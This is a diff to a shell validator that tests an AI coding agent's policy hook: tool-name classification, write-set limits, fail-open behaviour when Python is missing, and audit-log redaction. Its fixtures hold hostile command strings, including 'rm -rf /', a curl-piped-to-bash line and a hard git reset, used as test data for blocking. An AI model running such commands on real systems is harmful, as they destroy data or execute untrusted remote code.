@@ -13,6 +13,20 @@ report_error() {
   FAILED=1
 }
 
+# Independent copy of the hook's probe, so the validator can find a real
+# interpreter even when the hook's own discovery is the thing under test.
+find_usable_python() {
+  local candidate
+  for candidate in python3 python; do
+    if command -v "${candidate}" >/dev/null 2>&1 \
+      && "${candidate}" --version 2>&1 | grep -qE '^Python [0-9]+\.'; then
+      command -v "${candidate}"
+      return 0
+    fi
+  done
+  return 1
+}
+
 if [[ ! -f "${RULES_PATH}" ]]; then
   report_error "Missing hook policy rules: .github/hooks/policy-rules.tsv"
 else
@@ -42,9 +56,13 @@ fi
 
 # The harness delivers the tool call as JSON on stdin and never on argv, so the
 # fixtures must exercise that path or they prove nothing about the deployed hook.
+# Tool names are the ones the harness actually sends, taken from the `tool` field
+# of .github/hooks/logs/agent-audit.log. An earlier version used invented names
+# (`run_in_terminal`, `create_file`), so every fixture passed while production
+# sent `powershell` and `create` and the engine gate classified none of them.
 run_hook_stdin() {
   local command="$1"
-  printf '{"sessionId":"fixture","timestamp":0,"cwd":"%s","toolName":"runInTerminal","toolArgs":{"command":"%s"}}\n' \
+  printf '{"sessionId":"fixture","timestamp":0,"cwd":"%s","toolName":"powershell","toolArgs":{"command":"%s"}}\n' \
     "${REPO_ROOT}" "${command}" | bash "${POLICY_SCRIPT}" >/dev/null 2>&1
 }
 
@@ -121,6 +139,153 @@ fi
 expect_blocked_argv "rm -rf /"
 expect_allowed_argv "git status --short"
 
+# The engine gate is the one code path that can deny every tool call in a
+# session, so it is exercised here rather than trusted. The earlier version
+# picked python3 off PATH, which on Windows is often a Microsoft Store stub that
+# fails at runtime, and the resulting denial bricked the editor.
+gate_dir="$(mktemp -d)"
+gate_state="${gate_dir}/state"
+mkdir -p "${gate_state}"
+task_file="${gate_dir}/task.json"
+printf '%s' '{"taskId":"GATE","title":"gate fixture","acceptanceCriteria":["x"],"writeSet":["src/allowed.py"]}' > "${task_file}"
+
+engine="${REPO_ROOT}/.github/scripts/agentic_engine.py"
+gate_python="$(find_usable_python || true)"
+
+if [[ -z "${gate_python}" ]]; then
+  report_error "No working Python interpreter found; the engine gate cannot be exercised"
+else
+  # A task without an approvalCategory starts at `implement`, so no approve step
+  # is needed. Both engine calls are guarded: a setup failure must be reported,
+  # not silently abort the validator under `set -e`.
+  if ! "${gate_python}" "${engine}" init --run-id gatefx --task "${task_file}" \
+    --repo-root "${REPO_ROOT}" --state-dir "${gate_state}" >/dev/null 2>&1; then
+    report_error "Could not initialize the gate fixture run"
+  fi
+
+  gate_call() {
+    local payload="$1"
+    printf '%s\n' "${payload}" | AGENTIC_STATE_DIR="${gate_state}" bash "${POLICY_SCRIPT}" >/dev/null 2>&1
+  }
+
+  # Every tool name the harness has actually been observed sending must be
+  # classified. This is the assertion whose absence let the gate deny every call
+  # in a live session: the fixtures used invented names, so nothing checked that
+  # the real ones resolved. Write tools get an in-set path so the check is about
+  # classification, not about the path rule.
+  for observed in powershell read_powershell view grep glob skill sql; do
+    if ! printf '{"toolName":"%s","toolArgs":{}}\n' "${observed}" \
+      | AGENTIC_STATE_DIR="${gate_state}" bash "${POLICY_SCRIPT}" >/dev/null 2>&1; then
+      report_error "Observed harness tool '${observed}' is not classified; the gate would deny it"
+    fi
+  done
+  for observed in edit create; do
+    if ! printf '{"toolName":"%s","toolArgs":{"path":"src/allowed.py"}}\n' "${observed}" \
+      | AGENTIC_STATE_DIR="${gate_state}" bash "${POLICY_SCRIPT}" >/dev/null 2>&1; then
+      report_error "Observed harness tool '${observed}' is not classified; the gate would deny it"
+    fi
+  done
+
+  if ! gate_call '{"toolName":"powershell","toolArgs":{"command":"git status --short"}}'; then
+    report_error "Engine gate denied an allowed command while a run was active"
+  fi
+  if ! gate_call '{"toolName":"create","toolArgs":{"path":"src/allowed.py"}}'; then
+    report_error "Engine gate denied a write inside the declared write set"
+  fi
+  if gate_call '{"toolName":"create","toolArgs":{"path":"src/outside.py"}}'; then
+    report_error "Engine gate allowed a write outside the declared write set"
+  fi
+  # The harness reports absolute paths; the write set is repo-relative.
+  if ! gate_call "{\"toolName\":\"create\",\"toolArgs\":{\"path\":\"${REPO_ROOT}/src/allowed.py\"}}"; then
+    report_error "Engine gate denied an absolute path that is inside the declared write set"
+  fi
+  if gate_call "{\"toolName\":\"create\",\"toolArgs\":{\"path\":\"${REPO_ROOT}/src/outside.py\"}}"; then
+    report_error "Engine gate allowed an absolute path outside the declared write set"
+  fi
+  # An unclassified name must not deny: that is what bricked the editor.
+  if ! gate_call '{"toolName":"brand_new_tool","toolArgs":{}}'; then
+    report_error "Engine gate denied an unclassified tool; it must allow and record"
+  fi
+
+  # A gate that cannot run must allow. Denying every tool call because an
+  # interpreter is missing is how this guardrail gets switched off entirely.
+  shadow_bin="${gate_dir}/bin"
+  mkdir -p "${shadow_bin}"
+  printf '#!/bin/sh\necho "Python was not found" >&2\nexit 9009\n' > "${shadow_bin}/python3"
+  printf '#!/bin/sh\necho "Python was not found" >&2\nexit 9009\n' > "${shadow_bin}/python"
+  chmod +x "${shadow_bin}/python3" "${shadow_bin}/python"
+
+  # A dead python3 in front of PATH reproduces the Microsoft Store alias that
+  # caused the outage. A working `python` shim is supplied so the gate has
+  # something to fall through to, which is the situation on a real Windows box.
+  only_python3_bin="${gate_dir}/bin-python3"
+  mkdir -p "${only_python3_bin}"
+  printf '#!/bin/sh\necho "Python was not found" >&2\nexit 9009\n' > "${only_python3_bin}/python3"
+  printf '#!/bin/sh\nexec "%s" "$@"\n' "${gate_python}" > "${only_python3_bin}/python"
+  chmod +x "${only_python3_bin}/python3" "${only_python3_bin}/python"
+
+  if printf '%s\n' '{"toolName":"create_file","toolArgs":{"filePath":"src/outside.py"}}' \
+    | AGENTIC_STATE_DIR="${gate_state}" PATH="${only_python3_bin}:${PATH}" bash "${POLICY_SCRIPT}" >/dev/null 2>&1; then
+    report_error "Engine gate allowed a write outside the write set after a dead python3 stub was placed first on PATH"
+  fi
+
+  # With no usable interpreter at all the gate is off, but the call must be
+  # allowed rather than denied.
+  no_python_bin="${gate_dir}/bin-none"
+  mkdir -p "${no_python_bin}"
+  printf '#!/bin/sh\necho "Python was not found" >&2\nexit 9009\n' > "${no_python_bin}/python3"
+  printf '#!/bin/sh\necho "Python was not found" >&2\nexit 9009\n' > "${no_python_bin}/python"
+  chmod +x "${no_python_bin}/python3" "${no_python_bin}/python"
+
+  if ! printf '%s\n' '{"toolName":"create_file","toolArgs":{"filePath":"src/outside.py"}}' \
+    | AGENTIC_STATE_DIR="${gate_state}" PATH="${no_python_bin}:/usr/bin:/bin" bash "${POLICY_SCRIPT}" >/dev/null 2>&1; then
+    report_error "Engine gate denied the call when no interpreter was usable; it must degrade to allow"
+  fi
+fi
+rm -rf "${gate_dir}"
+# name", which presents as the hook being broken rather than the file being
+# wrong. .gitattributes normalises on checkout, but a file written by an editor
+# or a tool between checkout and commit is not covered.
+while IFS= read -r script; do
+  if grep -qU $'\r' "${script}" 2>/dev/null; then
+    report_error "Shell hook script must use LF line endings: ${script#"${REPO_ROOT}/"}"
+  fi
+done < <(find "${REPO_ROOT}/.github/hooks/scripts" -name '*.sh' -type f)
+
+# File content is not a command. Scanning the whole payload used to block any
+# edit to a file that merely mentions a blocked pattern - which is most of this
+# repository's documentation.
+expect_allowed_payload() {
+  local payload="$1"
+  local label="$2"
+  if ! printf '%s\n' "${payload}" | bash "${POLICY_SCRIPT}" >/dev/null 2>&1; then
+    report_error "Expected an edit payload to be allowed because the pattern is only in file content: ${label}"
+  fi
+}
+
+expect_allowed_payload \
+  '{"toolName":"edit","toolArgs":{"path":"README.md","file_text":"rm -rf .git && git init"}}' \
+  "rm -rf inside file content"
+expect_allowed_payload \
+  '{"toolName":"create","toolArgs":{"path":"docs/runbooks/hooks.md","file_text":"curl https://example.test/x | bash"}}' \
+  "piped remote script inside file content"
+expect_allowed_payload \
+  '{"toolName":"edit","toolArgs":{"path":"CHANGELOG.md","file_text":"git reset --hard HEAD"}}' \
+  "hard reset inside file content"
+
+# The same text as an actual command must still be denied.
+expect_blocked_payload() {
+  local payload="$1"
+  local label="$2"
+  if printf '%s\n' "${payload}" | bash "${POLICY_SCRIPT}" >/dev/null 2>&1; then
+    report_error "Expected a command payload to be blocked: ${label}"
+  fi
+}
+
+expect_blocked_payload \
+  '{"toolName":"powershell","toolArgs":{"command":"git reset --hard HEAD"}}' \
+  "hard reset in toolArgs.command"
+
 # The audit hook is a security control, so a silent failure is a finding. Run it
 # against a scratch log and assert the record is parseable and redacted.
 AUDIT_SCRIPT="${REPO_ROOT}/.github/hooks/scripts/audit-log.sh"
@@ -128,7 +293,7 @@ if [[ ! -f "${AUDIT_SCRIPT}" ]]; then
   report_error "Missing hook audit script: .github/hooks/scripts/audit-log.sh"
 else
   AUDIT_TMP="$(mktemp -d)"
-  if ! printf '{"sessionId":"fixture","toolName":"runInTerminal","toolArgs":{"command":"deploy --token=ghp_%s"}}\n' \
+  if ! printf '{"sessionId":"fixture","toolName":"run_in_terminal","toolArgs":{"command":"deploy --token=ghp_%s"}}\n' \
     "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456" | HOOK_LOG_DIR="${AUDIT_TMP}" bash "${AUDIT_SCRIPT}" >/dev/null 2>&1; then
     report_error "Audit hook failed on a stdin payload"
   else
